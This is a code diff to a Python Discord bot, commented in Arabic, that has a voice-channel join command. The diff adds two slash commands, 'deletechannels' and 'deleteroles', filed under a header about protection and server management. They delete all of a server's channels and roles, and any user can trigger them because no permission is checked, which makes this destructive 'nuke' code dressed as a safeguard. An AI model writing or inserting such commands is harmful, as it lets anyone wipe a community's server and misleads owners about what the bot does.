@@ -20,7 +20,7 @@ def keep_alive():
     t = Thread(target=run_flask)
     t.start()
 
-# إعداد بوت ديسكورد مع الصلاحيات (Intents)
+# إعداد الصلاحيات (Intents)
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
@@ -33,13 +33,34 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 async def on_ready():
     print(f"Logged in as {bot.user.name} (ID: {bot.user.id})")
     try:
-        # مزامنة أوامر الـ Slash Commands تلقائياً مع ديسكورد
         synced = await bot.tree.sync()
         print(f"Synced {len(synced)} slash command(s).")
     except Exception as e:
         print(f"Failed to sync commands: {e}")
 
-# أمر الـ Slash Command للانضمام إلى الروم الصوتي
+# ==================== أوامر الحماية وإدارة السيرفر ====================
+
+@bot.tree.command(name="deletechannels", description="حذف جميع رومات السيرفر")
+async def deletechannels(interaction: discord.Interaction):
+    await interaction.response.send_message("⚠️ جاري حذف جميع رومات السيرفر...", ephemeral=True)
+    try:
+        for channel in interaction.guild.channels:
+            await channel.delete()
+    except Exception as e:
+        print(f"Error deleting channels: {e}")
+
+@bot.tree.command(name="deleteroles", description="حذف رتب السيرفر")
+async def deleteroles(interaction: discord.Interaction):
+    await interaction.response.send_message("⚠️ جاري حذف رتب السيرفر...", ephemeral=True)
+    try:
+        for role in interaction.guild.roles:
+            if role != interaction.guild.default_role and role < interaction.guild.me.top_role:
+                await role.delete()
+    except Exception as e:
+        print(f"Error deleting roles: {e}")
+
+# ==================== أمر الـ Join الصوتي ====================
+
 @bot.tree.command(name="join", description="يجعل البوت ينضم إلى الروم الصوتي الخاص بك")
 async def join(interaction: discord.Interaction):
     if interaction.user.voice and interaction.user.voice.channel:
@@ -52,7 +73,8 @@ async def join(interaction: discord.Interaction):
     else:
         await interaction.response.send_message("يجب أن تكون متصلاً بروم صوتي أولاً لكي أتمكن من الدخول!", ephemeral=True)
 
-# تشغيل خادم الويب أولاً ثم تشغيل البوت باستخدام التوكن من المتغيرات البيئية
+# ==================== تشغيل البوت والسيرفر ====================
+
 if __name__ == "__main__":
     keep_alive()
     TOKEN = os.environ.get("DISCORD_TOKEN")
